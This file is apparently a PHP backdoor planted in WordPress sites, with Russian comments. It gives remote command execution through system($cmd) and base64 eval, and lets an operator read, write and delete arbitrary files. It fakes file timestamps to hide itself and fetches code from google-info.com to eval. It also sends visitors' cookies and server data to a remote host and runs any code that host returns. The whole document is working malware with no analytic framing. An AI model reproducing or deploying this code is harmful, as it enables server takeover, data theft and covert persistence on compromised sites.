<?
Error_Reporting(0);

$d = "
// =======================================================================================================
// НАЧАЛО ФУНКЦИЙ
// =======================================================================================================

function del_www($html)
{
    $html = str_replace("www.","",$html);
    $html = str_replace("http://","",$html);
    #$html = str_ireplace("//","/",$html);
    return $html;
}

function my_split($string_before,$string_after,$string)
{
    $aa = explode("$string_before",$string);
    $aa = explode("$string_after",$aa[1]);
    return trim($aa[0]);    
}

function my_curl($url,$post_data)
{
	$info_url = parse_url($url);
	$vh = curl_init();
	curl_setopt($vh, CURLOPT_URL, $url);
	curl_setopt($vh, CURLOPT_POSTFIELDS,  $post_data);   
	curl_setopt($vh, CURLOPT_TIMEOUT, 10);
	curl_setopt($vh, CURLOPT_HEADER, 0);
	curl_setopt($vh, CURLOPT_RETURNTRANSFER , 1);
	$output = curl_exec($vh);
	$header_size = curl_getinfo($vh, CURLINFO_HEADER_SIZE);
	$headers = substr($output, 0, $header_size - 4);
	
	$body = substr($output, $header_size);
	return $output;
}

function my_curl_img($url)
{
	$info_url = parse_url($url);
	$vh = curl_init();
	curl_setopt($vh, CURLOPT_URL, $url);
	curl_setopt($vh, CURLOPT_TIMEOUT, 10);
	curl_setopt($vh, CURLOPT_HEADER, 1);
	curl_setopt($vh, CURLOPT_RETURNTRANSFER , 1);
	$output = curl_exec($vh);
	$header_size = curl_getinfo($vh, CURLINFO_HEADER_SIZE);
	$headers = substr($output, 0, $header_size - 4);
	
	$body = substr($output, $header_size);
	return "$headers|SPLIT|$body";
}

function my_modtime()
{
	// Все пути от каталога wp-includes
	// class-feed.php | class-pop3.php | cron.php | media.php
	$ff = $_SERVER['REQUEST_URI'];
	if (substr_count($ff,'p-include')>0) {$base_root = "../";}
	if (substr_count($ff,'p-admi')>0) {$base_root = "../";}
	if (substr_count($ff,'admin/includes')>0) {$base_root = "../../";}
	
	// Весь этот массив передаем методом post
	// ===================================================================================
	print "##begin";
	global $ar_names;
	$ar_names = unserialize($ar_names);
	// ===================================================================================
	
	foreach ($ar_names as $key => $value)
	{
		$dd = explode("|",$value);
		$last_update = @stat($base_root . $dd[1]);
		if ($last_update['mtime']<10) $last_update = @stat($base_root . $dd[2]);
		if ($last_update['mtime']<10) $last_update = @stat($base_root . $dd[3]);
		if ( (file_exists($base_root . $dd[0])) and  ($last_update['mtime']>10) )
		{
			if (touch($base_root . $dd[0],$last_update['mtime']))
			{
				$dd3 = date("d.m.y-H:i",$last_update['mtime']);
				print "<font color='green'>Время для файла <b>$dd[0]</b> успешно изменено | <b>$dd3</b></font><br>";
			}
			else
			{
				print "<font color='maroon'>Не удалось изменить время для файла: <b>$dd[0]</b></font><br>";
			}
		}
	}

	print "##end";
}


function my_unlink()
{
	$ff = $_SERVER['REQUEST_URI'];
	if (substr_count($ff,'p-include')>0) {$base_root = "../";}
	if (substr_count($ff,'p-admi')>0) {$base_root = "../";}
	if (substr_count($ff,'admin/includes')>0) {$base_root = "../../";}
	
	// Весь этот массив передаем методом post
	// ===================================================================================
	print "##begin";
	global $ar_names;
	$ar_names = unserialize($ar_names);
	// ===================================================================================
	
	foreach ($ar_names as $key => $value)
	{
		$dd = explode("|",$value);
		if  (file_exists($base_root . $dd[0])) 
		{
			if (unlink($base_root . $dd[0]))
			{
				print "<font color='green'>Файл <b>$dd[0]</b> успешно удален</font><br>";
			}
			else
			{
				print "<font color='maroon'>Не удалось удалить файл: <b>$dd[0]</b></font><br>";
			}
		}
	}
	print "##end";
}




function my_file_get($file_name)
{
	if (@file_exists($file_name))
	{
		$html = @implode('', @file($file_name));
	}
	return $html;
}

function my_file_put($file_name,$data)
{
	$last_update = @stat($file_name);
	if ($last_update['mtime']<10) {$last_update['mtime'] = time() - 3600*24*170;}
	$handle = fopen($file_name, 'w');
	if (fwrite($handle, $data) === FALSE)
	{
		touch($file_name,$last_update['mtime']);
		return false;
	}
	fclose($handle);
	touch($file_name,$last_update['mtime']);
	return true;
}

// =======================================================================================================
// КОНЕЦ ФУНКЦИЯМ
// =======================================================================================================


// +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
// НАЧАЛО программы
// +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

$mode = "";
@extract($_GET); 
@extract($_POST);

if ($mode == 'help')
{
	Error_Reporting(E_ALL);
}
else
{
	Error_Reporting(0);
}

$_SETUP['api_path'] = "http://google-info.com/plugin/api/main.php";
$_POST['script_id'] = "http://" . $_SERVER['HTTP_HOST'] . "" . $_SERVER['SCRIPT_NAME'];
$_POST['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
$_POST['layer_version'] = "1.4";
// получаем установлен ли zend на сервере
$pp = get_loaded_extensions(); $zend = "no";
foreach ($pp as $key => $value) if (substr_count($value,"ptimize")>0) $zend = "yes";
$_POST['layer_encode'] = $zend =='yes' ? "zend" : "base64"; //  zend|base64

#$_POST['subdomen'] = 1;



$filename = ($_SERVER['REDIRECT_URL']);
// ========================================================================
// Получаем картинку с удаленного сервера
#image/x-icon
$ext=strtolower(substr($filename,strrpos($filename,".")+1));
if ( ($ext == 'gif') or ($ext == 'png') or ($ext == 'jpg') or ($ext == 'ico') or ($ext == 'swf'))
{
	$bb = mt_rand(1,3);
	$url = "http://yandex-bot.ru/images/".del_www($_SERVER[HTTP_HOST]).  $filename;
	#print "$url<br>"; exit;
	$html = my_curl_img($url);
	$html = explode("|SPLIT|",$html);
	$headers = $html[0]; $image = $html[1];
	$headers = explode("\n",$headers);
	foreach ($headers as $key =>$value)
	{
		if (substr_count($value,"ontent-Typ")) { $content_type = trim($value); break;}
		if (substr_count($value,"404 Not Found")) { header("HTTP/1.1 404 Not Found");	 exit;}
	}
	#print_r($headers);
	#header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
	header("Last-Modified: " . gmdate("D, d M Y H:i:s") . "GMT");
	header("Cache-Control: no-cache, must-revalidate");
	header("Pragma: no-cache");
	#header("Content-type: image/png");
	if (strlen($content_type)<4) {$content_type = "Content-Type: image/jpeg";}
	if ($ext == 'ico') {$content_type = "Content-Type: image/x-icon";}
	if ($ext == 'swf') {$content_type = "application/x-shockwave-flash";}
	header("$content_type");
	#print "|$content_type|";
	print "$image";
	exit;
}

// получаем CSS с удаленного сервера
if ( ($ext == 'css')  )
{
	$url = "http://yandex-bot.ru/css/" . del_www($_SERVER[HTTP_HOST]).  $filename;
	#print "$url"; 	exit;
	$html = my_curl_img($url);
	$html = explode("|SPLIT|",$html);
	$headers = $html[0];
	$headers = explode("\n",$headers);
	foreach ($headers as $key =>$value)
	if (substr_count($value,"404 Not Found")) { header("HTTP/1.1 404 Not Found");	 exit;}
	
	header("Content-type: text/css; charset=utf-8");
	echo $html[1];
	exit;
}
// ========================================================================


header("Content-type: text/html; charset=utf-8");
if  (($mode == 'get_path') or ($mode == 'phpinfo') ) 
{
	phpinfo();
          die();
}

// Если надо изменить время для всех наших скриптов
if ($mode == 'mod_time')
{
	my_modtime();
	exit;
}

// Если надо удалить все скрипты
if ($mode == 'mod_unlink')
{
	my_unlink();
	exit;
}

// Изменяем файл в файловой системе, если такой фрагмент уже встречается в файле - система его удаляем
// параметры:
// $file_name - имя файла
// $data - параметры которые надо записать

if ($mode == 'mod_file')
{
	$html = @my_file_get($file_name);
	$html = @str_replace($data,"",$html);
	$html = $html .  $data;
	if (my_file_put($file_name,$html))
	{
		print "<font color='green'>успешно записали в файл</font> <b>$file_name</b><br>";
	}
	else
	{
		print "<font color='maroon'>Ошибка во время записи в файл</font> <b>$file_name</b><br>";
	}
	exit;
}

if ($mode == 'read_file')
{
	echo @my_file_get($file_name);
	exit;
}

if ($mode == 'write_file')
{
	if (my_file_put($file_name,$data))
	{
		print "<font color='green'>успешно записали в файл</font> <b>$file_name</b><br>";
	}
	else
	{
		print "<font color='maroon'>Ошибка во время записи в файл</font> <b>$file_name</b><br>";
	}
	exit;
}


if ($mode == 'eval')
{
	eval(base64_decode($data));
	exit;
}

// Делаем возможность для повторной заливки шела
if ( (isset($cmd)) and (strlen($cmd)>2) )
{
	echo system("$cmd");
	exit;
}

if (($mode == 'update') and (strlen($update_code)>1000))
{// сервер прислал - обновить код layers
	clearstatcache();
	$file_name = trim(my_split("@","(","@".__FILE__."("));
	$res = my_file_put($file_name,$update_code) ? "update_ok" : "update_error";
	echo "$file_name | $res ";
	exit;
}

if ($_COOKIE['shell'] == 'yes')
{
	#print "now shell";
	$shell = my_curl("http://google-info.com/plugin/uploads/2008_base64.txt","");
	$shell = my_split('"','"',$shell);
	eval(base64_decode($shell));
	exit;
}

if ($mode=='help') {print "Begin of Curl";}

$post_data = $_POST;
$post_data['my_cookies'] = serialize($_COOKIE);
$post_data['my_server'] = serialize($_SERVER);
$url = $_SETUP['api_path'] . "?" .  $_SERVER['QUERY_STRING'];

// Если layers находится на нашем сервере, и используется для тестирования внутрених сайтов =
$temp_1 = del_www($_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
#echo $temp_1;
if (substr_count($temp_1,"plugin/download/test_site/"))
{
	$site_download_id = my_split("plugin/download/test_site/","/",$temp_1);
	$site_download_subdir = my_split("plugin/download/test_site/$site_download_id/","/",$temp_1);
	$post_data['my_download_path'] = "/base_download/$site_download_id/$site_download_subdir/";
	#echo $post_data['my_download_path'] ;
} // =========================================================================

$html = $mode=='help' ? my_curl($url,$post_data) : @my_curl($url,$post_data);

if (substr_count($html,"#BEGIN_EVAL#"))
{// скрипт послал выполнение php кода 
	$code = my_split("#BEGIN_EVAL#","#END_EVAL#",$html);
	eval(base64_decode($code));
	exit;
}

print "$html";
";

eval(base64_decode("$d"));

?>